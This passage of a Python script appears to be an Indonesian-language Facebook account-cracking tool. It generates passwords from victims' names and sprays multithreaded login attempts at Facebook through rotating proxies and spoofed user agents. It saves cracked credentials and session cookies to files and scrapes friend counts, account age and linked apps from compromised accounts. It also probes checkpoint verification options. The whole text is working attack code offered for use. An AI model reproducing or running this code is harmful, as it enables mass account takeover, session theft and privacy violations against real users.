	cetak(nel(ioz, title=' METODE '))
	hc = input(x+'['+p+'Shinzy'+x+'] Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	win = '#  WARNING: DISPLAYING RELATED APPLICATIONS OPTIONS WILL EXPOSE THE RESULTS "NEW SESSIONS", DON'
	win2 = mark(win, style='Bold blue')
	sol().print(win2)
	guw = '# SHOW RELATED APPLICATIONS '
	sol().print(mark(guw, style='bold green'))
	aplik = input(x+'['+p+'Shinzy'+x+'] y/t : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	guw = '# DI SARANKAN MENAMPILKAN OPSI CEKPOIN, AGAR AKUN BISA TERSIMPAN DI FOLDER DATA "SHIN-DATA" '
	sol().print(mark(guw, style='bold blue'))
	guw = '# TAMPILKAN AKUN CEKPOIN '
	sol().print(mark(guw, style='bold green'))
	cpres = input(x+'['+p+'Nazir'+x+'] y/t : ')
	if cpres in ['y','Y']:
		princp.append('ya')
	else:
		princp.append('no')
		
	passwrd()

# WORDLIST
def passwrd():
	ler = ' SEMUA DATA RESULT AKUN LIVE DAN CEKPOIN AKAN OTOMATIS TERSIMPAN DI DALAM FOLDER "SHIN-DATA" , SEGERA LAKUKAN PEMBUATAN FOLDER JIKA BELUM MEMPUNYAI FOLDER SHIN-DATA'
	sol().print(nel(ler, style='Bold white'))
	ler = ' CRACK WAS RUNNING, ON/OFF AIRCRAFT MODE 5 SECONDS IF THERE ARE NO RESULTS, I CAN'
	sol().print(nel(ler, style='Bold white'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
	print('')
	tanya = '# CRACK SELESAI , JALANKAN PERINTAH ULANG'
	sol().print(mark(tanya, style='green'))

# CRACKER
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%sZWEX %s🐍%s 🐍 OK:%s 🐍 CP:%s 🐍 %s%s%s   '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'× {idf} • {pw}'
					statuscp1 =nel(statuscp, style='bold yellow')
					cetak(nel(statuscp1, title='ZWEX XD CP'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; en-GB) AppleWebKit/534.8+ (KHTML like Gecko) Version/6.0.0.570 Mobile Safari/534.8+"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'└── {idf} • {pw}\n  └── {kuki}'
					statusok1 = nel(statusok, style='bold purple')
					cetak(nel(statusok1, title='ZWEX LIVE'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					emhp=requests.get('https://mbasic.facebook.com/profile.php?v=info',cookies=coki,headers=headapp).text
					try:
						tems=session.get('https://mbasic.facebook.com/profile.php?id='+idf+'&v=friends',cookies=coki,headers=headapp).text
						teman=re.search('>Teman (.*?)<',str(tems)).groups(1)
						tem=teman[0].split('(')
						temm=tem[1].split(')')
						infoakun+= (f"[bold blue][√] TEMAN : {temm[0]}[/blue]\n")
					except:
						infoakun+= (f"[bold blue][√] TEMAN : - [/blue]\n")
					try:
						tahs=session.get('https://mbasic.facebook.com/'+idf+'/allactivity/?entry_point=settings_yfi&settings_tracking=mbasic_footer_link%3Asettings_2_0&privacy_source=your_facebook_information&_rdr',cookies=coki,headers=headapp).text
						tah=re.findall('id="year_(.*?)"',str(tahs))
						tahu=(len(tah)-1)
						tahun=tah[tahu]
						infoakun+= (f"[bold blue][√] TAHUN : {tahun} [/blue]\n")
					except:
						infoakun+= (f"[bold blue][√] TAHUN : -  [/blue]\n")


					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[blue][•] APLIKASI AKTIF :[/blue] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[cyan][{nok}] {muncul[0]} {muncul[1]}[/cyan]\n")
						nok+=1
						
					hit=0
					infoakun += (f"\n[bold blue][•] APLIKASI EXPIRED :[/blue]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold red][{hit}] {muncul[0]} {muncul[1]}[/cyan]\n")
					print('\n')
					statusok = f'[bold green]✓ {idf} • {pw}\n✓ {kuki}[/green]\n√  {infoakun}'
					statusok1 = nel(statusok, style='bold green')
					cetak(nel(statusok1, title='[bold green]ZWEX LIVE[/bold green]'))
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

# OPSI
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%sâ””â”€â”€ %s|%s â”€â”€  CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%sâ””â”€â”€  Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%sâ””â”€â”€ %s|%s       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
 
# OPSI CEKER
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'â€¢'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%sâ””â”€â”€  %s ----> Error      %s'%(b,kes,x))
				print('\r%sâ””â”€â”€  Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%sâ•°â”€â”€â”€ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%sâ•°â”€â”€â”€ Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%sâ””â”€â”€   %s|%s      %s'%(b,id,pw,x))
					print('\r%sâ””â”€â”€  Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%sâ””â”€â”€   %s|%s      %s'%(h,id,pw,x))
			else:
				print('\r%sâ””â”€â”€  %s|%s â”€â”€  SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()

if __name__=='__main__':
	login()
